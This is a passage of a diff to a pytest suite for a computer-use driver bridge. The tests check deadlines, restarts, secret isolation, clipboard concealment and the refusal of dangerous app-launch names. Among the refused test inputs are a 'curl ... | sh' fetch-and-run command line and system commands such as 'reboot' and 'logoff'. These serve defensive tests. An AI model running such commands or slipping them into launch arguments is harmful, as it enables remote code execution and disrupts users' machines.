@@ -114,10 +114,11 @@ async def test_the_tool_list_deadline_covers_every_page(fake_log, monkeypatch) -
     started = time.monotonic()
     try:
         with pytest.raises(TimeoutError):
-            await asyncio.wait_for(client.list_tools(timeout=0.5), timeout=5)
+            await asyncio.wait_for(client.list_tools(timeout=0.5), timeout=30)
     finally:
         await client.close()
-    assert time.monotonic() - started < 3  # its own deadline, not the guard's
+    # Its own 0.5 s deadline, with 10x room for a slow runner, not the guard's.
+    assert time.monotonic() - started < 5
 
 
 async def test_a_request_past_its_deadline_is_cancelled_as_mcp_has_it(
@@ -172,6 +173,34 @@ async def test_a_call_past_its_deadline_stops_the_driver(fake_log: Path, monkeyp
     assert result["structuredContent"] == {"arguments": {"pid": 1}}
     assert _records(fake_log, "slow_done") == []
     assert len(_records(fake_log, "initialize")) == driver.MAX_STARTS_PER_WINDOW + 2
+
+
+async def test_a_new_display_restarts_the_driver_off_the_budget(
+    fake_log: Path, monkeypatch
+) -> None:
+    """A driver keeps the environment it started with, so after a new login
+    (another display, and on GNOME another XAUTHORITY) it drove a display
+    that was gone until something else restarted it. The bridge now starts
+    a driver with the display the shim has, and that restart, the shim's own
+    doing, doesn't count against the restart budget."""
+    monkeypatch.setenv("DISPLAY", ":0")
+    monkeypatch.setenv("XAUTHORITY", "/run/user/1000/xauth_0")
+    bridge = fake_bridge()
+    try:
+        await bridge.call_tool("click", {"pid": 1}, timeout=10)
+        for n in range(1, driver.MAX_STARTS_PER_WINDOW + 1):
+            monkeypatch.setenv("DISPLAY", f":{n}")
+            monkeypatch.setenv("XAUTHORITY", f"/run/user/1000/xauth_{n}")
+            await bridge.call_tool("click", {"pid": 1}, timeout=10)
+        await bridge.call_tool("click", {"pid": 2}, timeout=10)
+    finally:
+        await bridge.close()
+
+    started = [record["env"] for record in _records(fake_log, "initialize")]
+    assert [(env["DISPLAY"], env["XAUTHORITY"]) for env in started] == [
+        (f":{n}", f"/run/user/1000/xauth_{n}") for n in range(driver.MAX_STARTS_PER_WINDOW + 1)
+    ]
+    assert len(_records(fake_log, "call")) == driver.MAX_STARTS_PER_WINDOW + 2
 
 
 async def test_a_cancelled_call_stops_the_driver(fake_log: Path, monkeypatch) -> None:
@@ -231,6 +260,68 @@ async def test_a_driver_that_exits_fails_the_waiting_request(fake_log: Path) -> 
         assert not client.alive
     finally:
         await client.close()
+
+
+class _StalledInput:
+    """A pipe to a driver that has stopped reading its input: writes are
+    taken, and a drain past the first `drains` never ends."""
+
+    def __init__(self, drains: int = 0) -> None:
+        self.written: list[bytes] = []
+        self._drains = drains
+
+    def write(self, data: bytes) -> None:
+        self.written.append(data)
+
+    async def drain(self) -> None:
+        if self._drains > 0:
+            self._drains -= 1
+            return
+        await asyncio.Event().wait()
+
+    def is_closing(self) -> bool:
+        return False
+
+
+def _client_writing_to(stdin: _StalledInput) -> StdioMcpClient:
+    from types import SimpleNamespace
+
+    client = StdioMcpClient(["cua-driver", "mcp"])
+    client._process = SimpleNamespace(stdin=stdin, returncode=None, pid=1)  # type: ignore[assignment]
+    return client
+
+
+async def test_a_request_the_driver_does_not_read_ends_at_its_deadline() -> None:
+    """The deadline started once the request was written, so a driver that
+    had stopped reading its input held a large call in drain() for good,
+    and with it the computer's turn: the bridge stops the driver only when
+    the call returns."""
+    stdin = _StalledInput()
+    client = _client_writing_to(stdin)
+    task = asyncio.ensure_future(client.call_tool("type_text", {"text": "x" * 100}, timeout=0.2))
+    try:
+        done, _ = await asyncio.wait({task}, timeout=20)
+        assert task in done
+        with pytest.raises(TimeoutError):
+            task.result()
+    finally:
+        task.cancel()
+
+
+async def test_a_cancel_notice_the_driver_does_not_read_does_not_hold_the_call() -> None:
+    """The request went out, no answer came, and the cancel notice sent at
+    the deadline then waited in drain() for good."""
+    stdin = _StalledInput(drains=1)
+    client = _client_writing_to(stdin)
+    task = asyncio.ensure_future(client.call_tool("click", {"pid": 5}, timeout=0.2))
+    try:
+        done, _ = await asyncio.wait({task}, timeout=20)
+        assert task in done
+        with pytest.raises(TimeoutError):
+            task.result()
+        assert b"notifications/cancelled" in stdin.written[-1]
+    finally:
+        task.cancel()
 
 
 async def test_the_client_answers_the_servers_ping(fake_log: Path) -> None:
@@ -324,6 +415,25 @@ def test_the_driver_inherits_only_the_reviewed_cua_settings() -> None:
     assert env["DBUS_SESSION_BUS_ADDRESS"] == base["DBUS_SESSION_BUS_ADDRESS"]
 
 
+def test_the_driver_inherits_none_of_the_shims_own_settings() -> None:
+    """The driver took the shim's settings with the rest of its environment,
+    and an app it launched by name (a terminal, say) inherited them, the
+    keychain passphrase for the file fallback among them, where the agent
+    could show them with `env`."""
+    base = {
+        "PATH": "/usr/bin",
+        "DISPLAY": ":0",
+        "AUTOGPT_SHIM_KEYCHAIN_PASSPHRASE": "secret",
+        "AUTOGPT_SHIM_PLATFORM_URL": "https://platform.example",
+        "autogpt_shim_supervisor": "systemd",
+    }
+
+    env = driver.driver_environment(Path("/tmp/policy.yaml"), base)
+
+    assert not [name for name in env if name.upper().startswith("AUTOGPT_SHIM_")]
+    assert env["PATH"] == "/usr/bin" and env["DISPLAY"] == ":0"
+
+
 async def test_the_policy_file_is_private_and_removed_with_the_bridge(fake_log: Path) -> None:
     bridge = _bridge()
     await bridge.snapshot()
@@ -383,6 +493,46 @@ async def test_a_driver_that_fails_to_start_says_why(fake_log, monkeypatch) -> N
     with pytest.raises(DriverUnavailable, match="fake driver failed to start"):
         await bridge.snapshot()
     await bridge.close()
+
+
+@pytest.mark.parametrize(
+    "metadata",
+    [{"serverInfo": "cua-driver"}, {"capabilities": 1}, {"capabilities": ["tools"]}],
+    ids=["server-info", "capabilities", "capabilities-list"],
+)
+async def test_a_driver_with_malformed_initialize_metadata_is_stopped(
+    fake_log, monkeypatch, metadata: dict[str, Any]
+) -> None:
+    """A serverInfo or capabilities that wasn't an object was read after the
+    start's cleanup, so it raised a plain AttributeError or TypeError: the
+    driver it had started kept running, since the bridge didn't hold it
+    yet, and HELLO, which goes on without computer use only for
+    DriverUnavailable, failed."""
+    import json
+
+    monkeypatch.setenv("FAKE_CUA_INITIALIZE", json.dumps(metadata))
+    started: list[StdioMcpClient] = []
+
+    def factory(argv: list[str], **kwargs: Any) -> StdioMcpClient:
+        client = fake_client(argv, **kwargs)
+        started.append(client)
+        return client
+
+    bridge = CuaDriverBridge(
+        tools=catalog.offered_tools(enable_clipboard=False),
+        binary=FAKE,
+        platform="linux",
+        client_factory=factory,
+    )
+    try:
+        with pytest.raises(DriverUnavailable, match="isn't an object"):
+            await bridge.snapshot()
+        [client] = started
+        assert not client.alive
+    finally:
+        for client in started:
+            await client.close()
+        await bridge.close()
 
 
 async def test_a_policy_file_that_cannot_be_written_leaves_the_driver_unavailable(
@@ -534,11 +684,13 @@ def test_clipboard_tools_are_offered_only_when_enabled() -> None:
 def test_arguments_that_reach_the_disk_wait_for_approval(
     tool: str, arguments: dict, argument: str
 ) -> None:
+    # As on a Mac: a Windows bundle_id must also be an AUMID, which
+    # test_a_windows_bundle_id_must_be_an_aumid covers.
     with pytest.raises(catalog.ApprovalRequired) as waiting:
-        catalog.check_arguments(tool, arguments)
+        catalog.check_arguments(tool, arguments, platform="darwin")
     assert waiting.value.argument == argument
 
-    catalog.check_arguments(tool, arguments, approved=[argument])
+    catalog.check_arguments(tool, arguments, approved=[argument], platform="darwin")
 
 
 @pytest.mark.parametrize(
@@ -610,7 +762,7 @@ def test_arguments_this_machine_never_takes_are_refused(
     ],
 )
 def test_ordinary_arguments_pass(tool: str, arguments: dict) -> None:
-    catalog.check_arguments(tool, arguments)
+    catalog.check_arguments(tool, arguments, platform="darwin")
 
 
 @pytest.mark.parametrize(
@@ -619,9 +771,14 @@ def test_ordinary_arguments_pass(tool: str, arguments: dict) -> None:
         # cua-driver runs `sh` with the rest as its arguments: any command.
         ("sh -c curl${IFS}example.com|sh", {"sh"}, True),
         ("python3 -mhttp.server", {"python3"}, True),
-        # No program is called "Google", so the driver matches the app.
+        # A program's own name runs it, in the background: `reboot` restarts
+        # the computer.
+        ("reboot", {"reboot"}, True),
+        ("firefox", {"firefox"}, True),
+        # No program is called "Google" or "Firefox" (PATH is case-sensitive),
+        # so the driver matches the app by its display name.
         ("Google Chrome", set(), False),
-        ("firefox", {"firefox"}, False),
+        ("Firefox", {"firefox"}, False),
     ],
 )
 def test_a_linux_launch_name_is_not_a_command_line(
@@ -629,7 +786,8 @@ def test_a_linux_launch_name_is_not_a_command_line(
 ) -> None:
     """On Linux cua-driver runs `name` as a command line split at spaces
     before it looks for an installed app of that name, so a name could run
-    any program with any arguments without the approval launch_path needs."""
+    any program with any arguments without the approval launch_path needs,
+    and a program's own name ran that program, with none."""
 
     def on_path(word: str) -> str | None:
         return f"/usr/bin/{word}" if word in programs else None
@@ -683,7 +841,7 @@ def _config(tmp_path: Path, **overrides: Any) -> ShimConfig:
 async def make_handler(tmp_path: Path, fake_log: Path):
     made: list[ComputerUseHandler] = []
 
-    def make(**overrides: Any) -> ComputerUseHandler:
+    def make(platform: str = "linux", **overrides: Any) -> ComputerUseHandler:
         config = _config(tmp_path, **overrides)
         audit = AuditWriter(config.audit_log_path, b"a" * 32)
         handler = ComputerUseHandler(
@@ -692,7 +850,7 @@ async def make_handler(tmp_path: Path, fake_log: Path):
             driver=CuaDriverBridge(
                 tools=catalog.offered_tools(enable_clipboard=config.enable_clipboard),
                 binary=FAKE,
-                platform="linux",
+                platform=platform,
                 client_factory=_fake_client,
             ),
         )
@@ -816,6 +974,103 @@ async def test_the_platform_cannot_choose_the_session(make_handler, fake_log) ->
     assert call["arguments"]["session"] == handler.session_label
 
 
+async def test_a_session_the_driver_ended_goes_on_under_a_new_label(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    # cua-driver ends a named session left idle for five minutes and refuses
+    # every later call naming it.
+    handler = make_handler()
+    ended = handler.session_label
+    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", ended)
+
+    first = await handler.handle(_call("click", {"pid": 5}))
+    second = await handler.handle(_call("click", {"pid": 6}))
+
+    for response in (first, second):
+        assert isinstance(response, ComputerToolResultMessage)
+        assert response.payload.is_error is False
+    calls = _records(fake_log, "call")
+    assert [call["arguments"]["session"] for call in calls] == [ended, f"{ended}.1", f"{ended}.1"]
+    assert [call["arguments"]["pid"] for call in calls] == [5, 5, 6]
+    assert handler.session_label == f"{ended}.1"
+
+
+async def test_hellos_screen_size_survives_an_ended_session(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    handler = make_handler()
+    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", handler.session_label)
+
+    assert await handler.screen_size() == (1920, 1080)
+
+
+async def test_a_renewed_session_waits_no_longer_than_the_call_would(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    """The call that goes again under a new label got only what was left of
+    its timeout, not of its start window: when another chat's call took the
+    shared driver in between, a child's HELLO screen size or permission
+    check waited for it up to its whole timeout (10 s, 30 s), past the
+    platform's wait for the session to connect, instead of giving up as the
+    first call would have."""
+    handler = make_handler()
+    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", handler.session_label)
+    bridge = handler.driver
+    await bridge.snapshot()  # running already: the first try needs no start
+    real_call_tool = bridge.call_tool
+    calls = 0
+
+    async def call_tool(name, arguments, **kwargs):
+        nonlocal calls
+        calls += 1
+        result = await real_call_tool(name, arguments, **kwargs)
+        if calls == 1:
+            await bridge._turn.acquire()  # another chat's call takes the driver
+        return result
+
+    monkeypatch.setattr(bridge, "call_tool", call_tool)
+    try:
+        renewed = handler.call_driver(
+            "get_screen_size", {"session": handler.session_label}, timeout=60, start_within=0.5
+        )
+        with pytest.raises(driver.CallNotStarted):
+            await asyncio.wait_for(renewed, timeout=20)
+    finally:
+        if bridge._turn.locked():
+            bridge._turn.release()
+
+    assert calls == 2
+
+
+async def test_a_spent_start_window_still_reaches_a_free_driver(make_handler, fake_log) -> None:
+    """The start window bounds the wait for the driver's turn and its start.
+    A call with none of it left, but with the driver running and free, goes
+    ahead: the look at the desktop's display it makes first is no wait, and
+    is bounded by the call's own deadline."""
+    handler = make_handler()
+    await handler.driver.snapshot()
+
+    raw = await handler.call_driver(
+        "get_screen_size", {"session": handler.session_label}, timeout=30, start_within=0
+    )
+
+    assert raw["structuredContent"]["width"] == 1920
+
+
+async def test_a_refusal_for_another_reason_is_not_sent_again(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    handler = make_handler()
+    label = handler.session_label
+    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", "autogpt-someone-else")
+
+    response = await handler.handle(_call("click", {"pid": 5}))
+
+    assert isinstance(response, ComputerToolResultMessage)
+    [call] = _records(fake_log, "call")
+    assert call["arguments"]["session"] == label == handler.session_label
+
+
 async def test_sessions_get_their_own_labels(make_handler) -> None:
     assert make_handler(session_id="a").session_label != make_handler(session_id="b").session_label
 
@@ -828,6 +1083,131 @@ async def test_the_drivers_own_error_comes_back_as_a_result(make_handler) -> Non
     assert isinstance(response, ComputerToolResultMessage)
     assert response.payload.is_error is True
     assert response.payload.structured_content == {"code": "stale"}
+
+
+@pytest.mark.parametrize(
+    ("bundle_id", "platform", "refused"),
+    [
+        ("com.apple.calculator", "win32", True),
+        ("logoff", "win32", True),
+        ("a!b!c", "win32", True),
+        ("!App", "win32", True),
+        ("Microsoft.WindowsNotepad_8wekyb3d8bbwe!App", "win32", False),
+        ("com.apple.calculator", "darwin", False),
+    ],
+)
+def test_a_windows_bundle_id_must_be_an_aumid(bundle_id: str, platform: str, refused: bool) -> None:
+    """On Windows cua-driver 0.38 launches a bundle_id that is an AUMID
+    (`Package!App`) as a packaged app and hands anything else to
+    ShellExecuteEx as a program name, without looking for an installed app:
+    `logoff` signed the person out, unasked."""
+
+    def check() -> None:
+        catalog.check_arguments(
+            "launch_app", {"bundle_id": bundle_id}, platform=platform, on_path=lambda _: None
+        )
+
+    if refused:
+        with pytest.raises(catalog.ArgumentRefused) as caught:
+            check()
+        assert caught.value.argument == "bundle_id"
+    else:
+        check()
+
+
+@pytest.mark.parametrize(
+    ("name", "matches"),
+    [
+        ("Notepad", True),
+        ("notepad", True),
+        ("NOTEPAD.EXE", True),
+        (" Google ", True),
+        ("goog", True),
+        ("logoff", False),
+        ("shutdown.exe", False),
+        ("", False),
+        (".exe", False),
+    ],
+)
+def test_a_windows_launch_name_matches_as_the_driver_matches(name: str, matches: bool) -> None:
+    """cua-driver 0.38 on Windows: the exact name ignoring case and a
+    trailing `.exe`, else the shortest installed name starting with it."""
+    assert catalog.windows_app_name_matches(name, ["Notepad", "Google Chrome"]) is matches
+
+
+async def test_a_windows_launch_by_a_name_no_app_has_never_reaches_the_driver(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    """With no installed app of that name, cua-driver hands the name to
+    ShellExecuteEx, which runs a program of that name from PATH, out of
+    sight: `logoff` would sign the person out, unasked. A running process
+    of that name, which no installed app matched, doesn't count."""
+    monkeypatch.setenv("FAKE_CUA_APPS", json.dumps(["Notepad", "Google Chrome"]))
+    handler = make_handler(platform="win32")
+
+    response = await handler.handle(_call("launch_app", {"name": "logoff"}))
+
+    assert isinstance(response, ErrorMessage)
+    assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
+    assert response.payload.details == {"tool": "launch_app", "argument": "name"}
+    assert [call["tool"] for call in _records(fake_log, "call")] == ["list_apps"]
+
+
+async def test_a_windows_launch_by_an_installed_apps_name_goes_ahead(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    monkeypatch.setenv("FAKE_CUA_APPS", json.dumps(["Notepad", "Google Chrome"]))
+    handler = make_handler(platform="win32")
+
+    first = await handler.handle(_call("launch_app", {"name": "notepad.exe"}))
+    second = await handler.handle(_call("launch_app", {"name": "Goog"}))
+
+    for response in (first, second):
+        assert isinstance(response, ComputerToolResultMessage)
+        assert response.payload.is_error is False
+    # The installed apps are listed once and kept for a while.
+    assert [call["tool"] for call in _records(fake_log, "call")] == [
+        "list_apps",
+        "launch_app",
+        "launch_app",
+    ]
+
+
+async def test_a_windows_launch_name_is_refused_when_the_apps_cannot_be_listed(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    monkeypatch.setenv("FAKE_CUA_LIST_APPS_ERROR", "the Windows shell did not answer")
+    handler = make_handler(platform="win32")
+
+    response = await handler.handle(_call("launch_app", {"name": "Notepad"}))
+
+    assert isinstance(response, ErrorMessage)
+    assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
+    assert [call["tool"] for call in _records(fake_log, "call")] == ["list_apps"]
+
+
+@pytest.mark.parametrize(
+    ("platform", "arguments"),
+    [
+        ("win32", {"name": "logoff", "aumid": "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App"}),
+        ("win32", {"name": "logoff", "bundle_id": "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App"}),
+        ("linux", {"name": "Calculator"}),
+        ("darwin", {"name": "Calculator"}),
+    ],
+    ids=["windows-aumid", "windows-aumid-bundle-id", "linux", "macos"],
+)
+async def test_a_launch_the_name_lookup_doesnt_decide_lists_no_apps(
+    make_handler, fake_log, monkeypatch, platform: str, arguments: dict
+) -> None:
+    """An AUMID wins over the name in cua-driver's routing, and elsewhere
+    than Windows the name never reaches ShellExecuteEx."""
+    monkeypatch.setenv("FAKE_CUA_APPS", json.dumps(["Notepad"]))
+    handler = make_handler(platform=platform)
+
+    response = await handler.handle(_call("launch_app", arguments))
+
+    assert isinstance(response, ComputerToolResultMessage)
+    assert [call["tool"] for call in _records(fake_log, "call")] == ["launch_app"]
 
 
 @pytest.mark.parametrize(
@@ -927,6 +1307,25 @@ async def test_an_approved_disk_argument_is_relayed_and_audited_whole(
     assert record["details"]["approved_arguments"] == ["screenshot_out_file"]
     # The audit keeps the whole path the person approved.
     assert record["details"]["arguments"]["screenshot_out_file"] == path
+
+
+async def test_an_approval_name_the_tool_lacks_keeps_its_record_cut(
+    make_handler, fake_log, tmp_path
+) -> None:
+    """Any approved_arguments entry turned the audit's cut off, so a call
+    naming one the tool doesn't have, refused right after, had its long
+    arguments written to the audit log whole, time after time."""
+    handler = make_handler()
+    url = "https://example.com/" + "a" * 5000
+
+    response = await handler.handle(
+        _call("browser_navigate", {"url": url}, approved_arguments=["screenshot_out_file"])
+    )
+
+    assert isinstance(response, ErrorMessage)
+    assert _records(fake_log, "call") == []
+    [record] = _audit(tmp_path)
+    assert len(record["details"]["arguments"]["url"]) < 300
 
 
 async def test_an_approval_covers_only_the_argument_it_names(make_handler, fake_log) -> None:
@@ -1052,6 +1451,24 @@ async def test_an_image_too_large_for_the_connection_is_left_out(make_handler, m
     assert (record["details"]["images"], record["details"]["images_withheld"]) == (0, 1)
 
 
+async def test_an_image_past_the_negotiated_payload_limit_is_left_out(
+    make_handler, monkeypatch
+) -> None:
+    """A result was held only to the frame's budget, so with a lower
+    negotiated max_file_size_bytes, which bounds every operation's payload
+    (PROTOCOL.md), a screenshot could exceed the limit the platform set."""
+    monkeypatch.setenv("FAKE_CUA_IMAGE_BYTES", "4000")
+    handler = make_handler()
+    handler.config.max_file_size_bytes = 1000
+
+    response = await handler.handle(_call("get_window_state", {"pid": 1}))
+
+    assert isinstance(response, ComputerToolResultMessage)
+    assert not [b for b in response.payload.content if isinstance(b, ComputerImageContent)]
+    assert any("too large" in b.text for b in response.payload.content
+               if isinstance(b, ComputerTextContent))  # fmt: skip
+
+
 async def test_text_is_measured_as_json_writes_it(make_handler, monkeypatch) -> None:
     """The budget counted a text block's raw UTF-8 bytes, but JSON writes a
     control character as six bytes and a quote as two, so a result could
@@ -1072,6 +1489,59 @@ async def test_text_is_measured_as_json_writes_it(make_handler, monkeypatch) -> 
     assert any("cut down" in text for text in texts)
 
 
+async def test_a_cut_down_result_fits_the_negotiated_limit_as_json(make_handler) -> None:
+    """The last cut held the text to the budget in UTF-8 bytes, but JSON
+    writes a control character as six: 600 NULs passed a 1,000-byte limit
+    and took over 3,600 bytes on the wire. The notes added after the check
+    weren't counted either."""
+    handler = make_handler()
+    handler.config.max_file_size_bytes = 1000
+
+    payload, _summary = handler._result_payload(
+        "get_window_state", {"content": [{"type": "text", "text": "\x00" * 600}]}
+    )
+
+    texts = [b.text for b in payload.content if isinstance(b, ComputerTextContent)]
+    assert sum(len(json.dumps(text, ensure_ascii=False).encode()) for text in texts) <= 1000
+    assert any("cut down" in text for text in texts)
+    assert texts[0] and set(texts[0]) == {"\x00"}
+
+
+async def test_a_call_cancelled_again_while_its_driver_stops_keeps_the_turn(
+    fake_log, monkeypatch
+) -> None:
+    """A call past its deadline stops the driver to end it, shielded from a
+    further cancel. One cancelled again while the driver stopped let go of
+    the turn at once, and the next call could start a second driver while
+    the first still acted on the desktop."""
+    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "30")
+    bridge = fake_bridge()
+    stopping = asyncio.Event()
+    stopped = asyncio.Event()
+    real_stop = bridge._stop_unfinished
+
+    async def slow_stop(client: Any) -> None:
+        stopping.set()
+        await stopped.wait()
+        await real_stop(client)
+
+    monkeypatch.setattr(bridge, "_stop_unfinished", slow_stop)
+    call = asyncio.ensure_future(bridge.call_tool("drag", {"pid": -2}, timeout=1))
+    try:
+        await asyncio.wait_for(stopping.wait(), timeout=30)
+        call.cancel()  # given up on again, while the driver stops
+        for _ in range(20):
+            await asyncio.sleep(0)
+        assert call.done()
+        assert bridge._turn.locked()
+    finally:
+        stopped.set()
+    async with asyncio.timeout(10):
+        while bridge._turn.locked():
+            await asyncio.sleep(0.01)
+    await bridge.close()
+
+
 async def test_a_call_past_its_timeout_is_stopped_at_the_driver(
     make_handler, fake_log, monkeypatch
 ) -> None:
@@ -1085,9 +1555,183 @@ async def test_a_call_past_its_timeout_is_stopped_at_the_driver(
     assert isinstance(response, ErrorMessage)
     assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
     assert "stopped cua-driver" in response.payload.message
-    assert response.payload.details == {"tool": "drag", "timeout_seconds": 1}
+    assert response.payload.details == {"tool": "drag", "timeout_seconds": 1, "started": True}
     assert isinstance(after, ComputerToolResultMessage)
     assert _records(fake_log, "slow_done") == []
+
+
+async def test_a_call_kept_waiting_past_its_deadline_never_starts(
+    make_handler, fake_log, monkeypatch
+) -> None:
+    """The deadline started only once the call had the computer, so a call
+    queued behind another chat's could start its action after the platform
+    had given up on it, on a screen that had changed since."""
+    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "2")
+    first = make_handler(session_id=None)
+    second = make_handler(session_id="other-chat")
+    first.share_with(second)
+    slow = asyncio.create_task(first.handle(_call("drag", {"pid": -2}, timeout_seconds=30)))
+    for _ in range(250):
+        if _records(fake_log, "call"):
+            break
+        await asyncio.sleep(0.02)
+
+    queued = await second.handle(_call("click", {"pid": 7}, timeout_seconds=1))
+    await slow
+
+    assert isinstance(queued, ErrorMessage)
+    assert queued.payload.code == ErrorCode.COMMAND_TIMEOUT
+    assert queued.payload.details == {"tool": "click", "timeout_seconds": 1, "started": False}
+    assert "Nothing ran" in queued.payload.message
+    assert [r["tool"] for r in _records(fake_log, "call")] == ["drag"]
+
+
+class _HeldStart:
+    """A client factory whose drivers don't finish starting until `go` is
+    set, counting the starts."""
+
+    def __init__(self) -> None:
+        self.go = asyncio.Event()
+        self.starting = asyncio.Event()
+        self.started: list[StdioMcpClient] = []
+
+    def __call__(self, argv: list[str], **kwargs: Any) -> StdioMcpClient:
+        held = self
+
+        class Held(StdioMcpClient):
+            async def start(self, *, timeout: float) -> Any:
+                held.starting.set()
+                await held.go.wait()
+                return await super().start(timeout=timeout)
+
+        client = Held([sys.executable, *argv], **kwargs)
+        self.started.append(client)
+        return client
+
+
+async def test_a_call_gives_up_on_a_slow_start_and_leaves_it_running(fake_log) -> None:
+    """Starting the driver on a call's first use ignored the call's deadline,
+    holding the driver's turn for as long as the start took, which kept
+    HELLO's screen size and other chats' calls waiting past theirs. The
+    start isn't stopped either: that would count against the restart
+    budget."""
+    held = _HeldStart()
+    bridge = CuaDriverBridge(
+        tools=catalog.offered_tools(enable_clipboard=False),
+        binary=FAKE,
+        platform="linux",
+        client_factory=held,
+    )
+    try:
+        first = asyncio.ensure_future(bridge.call_tool("get_screen_size", {}, timeout=0.3))
+        done, _ = await asyncio.wait({first}, timeout=20)
+        assert first in done
+        with pytest.raises(driver.CallNotStarted):
+            first.result()
+        # The driver's turn is free, and the start goes on.
+        assert not bridge._turn.locked()
+        assert held.starting.is_set() and len(held.started) == 1
+
+        held.go.set()
+        result = await bridge.call_tool("get_screen_size", {}, timeout=30)
+
+        assert result["structuredContent"]["width"] == 1920
+        assert len(held.started) == 1
+        assert held.started[0].alive
+    finally:
+        held.go.set()
+        await bridge.close()
+
+
+async def test_a_call_gives_up_on_a_display_check_that_hangs(fake_log) -> None:
+    """Before each call the bridge looks at the desktop's display (systemctl,
+    under the systemd service), in a thread, with no deadline: a look that
+    hung, or waited for a thread while every one was busy, kept the call
+    waiting past its deadline, holding the driver's turn every chat's calls
+    share."""
+    import threading
+    from unittest.mock import patch
+
+    from autogpt_local_executor import platform_info
+
+    released = threading.Event()
+
+    def follow() -> bool:
+        released.wait(60)
+        return False
+
+    bridge = _bridge()
+    try:
+        with patch.object(platform_info.session_display, "follow", follow):
+            call = asyncio.ensure_future(bridge.call_tool("get_screen_size", {}, timeout=0.3))
+            done, _ = await asyncio.wait({call}, timeout=20)
+            assert call in done
+            with pytest.raises(driver.CallNotStarted):
+                call.result()
+            assert not bridge._turn.locked()
+    finally:
+        released.set()
+        await bridge.close()
+
+
+async def test_a_call_whose_deadline_passes_while_the_driver_starts_never_runs(
+    tmp_path, fake_log
+) -> None:
+    held = _HeldStart()
+    config = _config(tmp_path)
+    handler = ComputerUseHandler(
+        config,
+        audit=AuditWriter(config.audit_log_path, b"a" * 32),
+        driver=CuaDriverBridge(
+            tools=catalog.offered_tools(enable_clipboard=False),
+            binary=FAKE,
+            platform="linux",
+            client_factory=held,
+        ),
+    )
+    try:
+        call = asyncio.ensure_future(handler.handle(_call("click", {"pid": 7}, timeout_seconds=1)))
+        done, _ = await asyncio.wait({call}, timeout=20)
+        assert call in done
+        response = call.result()
+
+        assert isinstance(response, ErrorMessage)
+        assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
+        assert response.payload.details == {"tool": "click", "timeout_seconds": 1, "started": False}
+        assert "starting" in response.payload.message
+        assert _records(fake_log, "call") == []
+    finally:
+        held.go.set()
+        await handler.close()
+
+
+async def test_the_deadline_counts_from_when_the_shim_received_the_call(
+    make_handler, fake_log
+) -> None:
+    """Time already spent waiting for a request slot counts too."""
+    handler = make_handler()
+    received_at = asyncio.get_running_loop().time() - 5
+
+    response = await handler.handle(
+        _call("click", {"pid": 7}, timeout_seconds=2), received_at=received_at
+    )
+
+    assert isinstance(response, ErrorMessage)
+    assert response.payload.details["started"] is False
+    assert _records(fake_log, "call") == []
+
+
+@pytest.mark.parametrize("width", ["NaN", "Infinity"])
+async def test_a_screen_size_that_is_not_a_finite_number_is_left_out(
+    make_handler, fake_log, monkeypatch, width: str
+) -> None:
+    """The driver's output is read with Python's json, which takes NaN and
+    Infinity, and int() of either raised, so HELLO failed instead of going
+    out without the size."""
+    monkeypatch.setenv("FAKE_CUA_SCREEN", f'{{"width": {width}, "height": 1080}}')
+    handler = make_handler()
+
+    assert await handler.screen_size() is None
 
 
 async def test_hello_skips_the_screen_size_rather_than_end_another_call(
@@ -1202,7 +1846,7 @@ def a_clean_clipboard(monkeypatch: pytest.MonkeyPatch) -> list[concealed.Clipboa
     states: list[concealed.ClipboardState] = []
     from autogpt_local_executor import handlers
 
-    def look() -> concealed.ClipboardState:
+    def look(_timeout: float | None = None) -> concealed.ClipboardState:
         return states.pop(0) if states else concealed.ClipboardState(None, 7)
 
     monkeypatch.setattr(handlers, "clipboard_state", look)
@@ -1263,6 +1907,145 @@ async def test_foreign_clipboard_reads_refuse_a_copy_made_during_the_read(
 
     assert isinstance(response, ErrorMessage)
     assert response.payload.details == {"reason": "changed"}
+
+
+async def test_foreign_clipboard_reads_without_a_sequence_number_read_twice(
+    make_handler, tmp_path, a_clean_clipboard
+) -> None:
+    """Linux keeps no clipboard sequence number, and cua-driver reads the
+    types and then the text: a password manager's copy between the two,
+    replaced before the shim looked again, came back as clean text."""
+    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
+    clipboard = tmp_path / "clipboard.txt"
+    clipboard.write_text("s3cret")  # read while its marker went unseen
+    a_clean_clipboard.extend([concealed.ClipboardState(None), concealed.ClipboardState(None)])
+    driver = handler.driver
+    real_call = driver.call_tool
+
+    async def call_tool(name: str, arguments: dict, **kwargs: Any) -> dict:
+        result = await real_call(name, arguments, **kwargs)
+        if name == "clipboard_read":
+            clipboard.write_text("copied after it")  # the clipboard moves on
+        return result
+
+    driver.call_tool = call_tool  # type: ignore[method-assign]
+
+    response = await handler.handle(_call("clipboard_read"))
+
+    assert isinstance(response, ErrorMessage)
+    assert response.payload.code == ErrorCode.CLIPBOARD_CONCEALED
+    assert response.payload.details == {"reason": "changed"}
+    assert "s3cret" not in response.model_dump_json()
+
+
+async def test_a_second_read_that_finds_the_same_text_returns_it(
+    make_handler, tmp_path, a_clean_clipboard
+) -> None:
+    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
+    (tmp_path / "clipboard.txt").write_text("a copied paragraph")
+    a_clean_clipboard.extend([concealed.ClipboardState(None), concealed.ClipboardState(None)])
+
+    response = await handler.handle(_call("clipboard_read"))
+
+    assert isinstance(response, ComputerToolResultMessage)
+    assert response.payload.structured_content["text"] == "a copied paragraph"
+
+
+async def test_a_clipboard_read_whose_deadline_passes_in_the_marker_check_never_starts(
+    make_handler, tmp_path, fake_log, monkeypatch
+) -> None:
